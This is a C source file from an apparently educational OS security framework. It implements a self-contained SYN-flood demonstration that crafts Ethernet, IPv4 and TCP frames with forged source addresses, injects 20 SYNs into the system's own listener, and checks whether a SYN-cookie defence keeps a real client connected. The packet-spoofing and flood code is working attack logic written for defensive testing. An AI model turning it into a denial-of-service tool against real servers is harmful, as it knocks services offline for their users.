/*
 * atk_syn_flood.c - ATTACK syn_flood: fill the listen queue with half-open connections
 *
 * Breaks:     liveness - a listening server always takes new connections
 * Stopped by: syn_cookies (defence/syn_cookies)
 *
 * Each SYN makes the server remember a half-open connection (SYN_RECV)
 * and wait for the third ACK, which never comes from a forged source.
 * A few dozen SYNs fill the queue and real clients are refused.
 *
 * launch():  listen on port 7777 (queue of 4), inject 20 SYNs from
 *            forged addresses, then connect for real.
 *            findings = 1 if the real connection failed.
 * cleanup(): close the listener (its half-open children go with it).
 *
 * Uses: socket_* (core/socket), netdev_inject (core/netdev), tcp_stats (core/tcp), ui_*.
 */

#include "modules/security_management/core/registry/registry.h"                 // attack_t, registry_add_attack
#include "modules/network_management/security/syn_flood/defence/syn_cookies/def_syn_cookies.h" // def_syn_cookie_make
#include "modules/network_management/core/netdev/netdev.h"                      // netdev_by_name, netdev_inject, netdev_lock
#include "modules/network_management/core/ethernet/ethernet.h"                  // eth_header_t, ETH_*
#include "modules/network_management/core/ipv4/ipv4.h"                          // ipv4_header_t, ipv4_stats
#include "modules/network_management/core/icmp/icmp.h"                          // icmp_header_t, icmp_stats
#include "modules/network_management/core/inet/inet.h"                          // htons, inet_checksum, INET_ADDR
#include "lib/string/string.h"                                                  // memcpy, memset
#include "modules/network_management/core/tcp/tcp.h"                            // tcp_header_t, tcp_conn_t, TCP_*
#include "modules/network_management/core/socket/socket.h"                      // socket_*
#include "modules/ui/core/style/ui.h"                                           // ui_printf, ui_color

// An IPv4 packet inside an Ethernet frame for 'dev', as a machine on the
// link would send it: 'opt' (opt_len bytes of options), then 'data'.
// Returns the frame's length.
static int build_ip(uint8_t *f, const netdev_t *dev, uint32_t src, uint32_t dst, uint8_t proto,
                    uint16_t id, uint16_t frag, const uint8_t *opt, int opt_len, const void *data, int len) {
    static const uint8_t neighbour[6] = { 0x02, 0x00, 0x00, 0xaa, 0xbb, 0xcc };
    int hlen = IPV4_HLEN + opt_len;
    memset(f, 0, ETH_ZLEN);
    eth_header_t *eth = (eth_header_t *)f;
    memcpy(eth->dest, dev->mac, 6);
    memcpy(eth->src, neighbour, 6);
    eth->type = htons(ETH_P_IP);
    ipv4_header_t *ip = (ipv4_header_t *)(f + ETH_HLEN);
    ip->version_ihl = (uint8_t)(0x40 | (hlen / 4));
    ip->total_length = htons((uint16_t)(hlen + len));
    ip->id = htons(id);
    ip->frag = htons(frag);
    ip->ttl = 64;
    ip->protocol = proto;
    ip->src = htonl(src);
    ip->dst = htonl(dst);
    if (opt_len)
        memcpy(f + ETH_HLEN + IPV4_HLEN, opt, opt_len);
    ip->checksum = inet_checksum(ip, hlen);
    memcpy(f + ETH_HLEN + hlen, data, len);
    return ETH_HLEN + hlen + len < ETH_ZLEN ? ETH_ZLEN : ETH_HLEN + hlen + len;
}

// A bare TCP header (no options, no data) with its checksum.
static int build_tcp(uint8_t *out, uint32_t src, uint32_t dst, uint16_t sport, uint16_t dport,
                     uint32_t seq, uint32_t ack, uint8_t flags) {
    tcp_header_t *h = (tcp_header_t *)out;
    memset(out, 0, TCP_HLEN);
    h->src_port = htons(sport);
    h->dst_port = htons(dport);
    h->seq = htonl(seq);
    h->ack = htonl(ack);
    h->offset = (TCP_HLEN / 4) << 4;
    h->flags = flags;
    h->window = htons(8192);
    h->checksum = inet_checksum_pseudo(src, dst, IPPROTO_TCP, out, TCP_HLEN);
    return TCP_HLEN;
}

#define PORT 7777
static socket_t *listener;

static int simulate(void) {
    ui_printf("  every SYN = a half-open connection the server must remember\n");
    ui_printf("  forged sources never send the final ACK: the queue stays full\n");
    return 1;
}

static int launch(void) {
    netdev_t *eth = netdev_by_name("eth0");
    if (!eth || !eth->ip) {
        ui_printf("  needs eth0 with an address (dhclient)\n");
        return 0;
    }
    static uint8_t f[ETH_ZLEN + 1600];
    uint8_t data[64];

    sockaddr_t a;
    uint32_t len = sizeof(a);
    if (socket_create(AF_INET, SOCK_STREAM, 0, &listener) < 0)
        return 0;
    socket_inet_addr(&a, &len, 0, PORT);
    if (socket_bind(listener, &a, len) < 0 || socket_listen(listener, 4) < 0) {
        ui_printf("  port %d is busy\n", PORT);
        return 0;
    }
    uint32_t drops = tcp_stats()->backlog_drops;
    // Forged sources must never answer: addresses on our link that nobody
    // has (their SYN-ACKs die in ARP). QEMU's router would answer any other.
    for (int i = 0; i < 20; i++) {
        uint32_t forged = INET_ADDR(10, 0, 2, 150 + i);
        int n = build_tcp(data, forged, eth->ip, (uint16_t)(30000 + i), PORT, 1000u * i, 0, TCP_SYN);
        netdev_inject(eth, f, (uint16_t)build_ip(f, eth, forged, eth->ip, IPPROTO_TCP, (uint16_t)i, 0, 0, 0, data, n));
    }
    ui_printf("  20 forged SYNs; the queue holds 4 (%u SYNs found it full)\n", tcp_stats()->backlog_drops - drops);
    socket_t *client;
    if (socket_create(AF_INET, SOCK_STREAM, 0, &client) < 0)
        return 0;
    socket_timeval_t wait = { 2, 0 };
    socket_setopt(client, SOL_SOCKET, SO_SNDTIMEO, &wait, sizeof(wait));
    len = sizeof(a);
    socket_inet_addr(&a, &len, INET_ADDR(127, 0, 0, 1), PORT);
    int r = socket_connect(client, &a, len);
    socket_close(client);
    ui_printf("  a real client connects -> %s\n", r == 0 ? "connected" : "FAILED");
    ui_color(r != 0 ? UI_BAD : UI_GOOD);
    ui_printf("  %s\n", r != 0 ? "the server is unreachable: the flood works" : "the real client got in (a SYN cookie carried it)");
    ui_reset();
    return r != 0;
}

static int cleanup(void) {
    if (!listener)
        return 0;
    socket_close(listener);
    listener = 0;
    return 1;
}

static const attack_t attack = {
    "syn_flood",
    "SYNs from forged sources fill a server's listen queue",
    INV_LIVENESS, SEV_HIGH,
    simulate, launch, cleanup,
    "syn_cookies"
};

void atk_syn_flood_register(void) { registry_add_attack(&attack); }
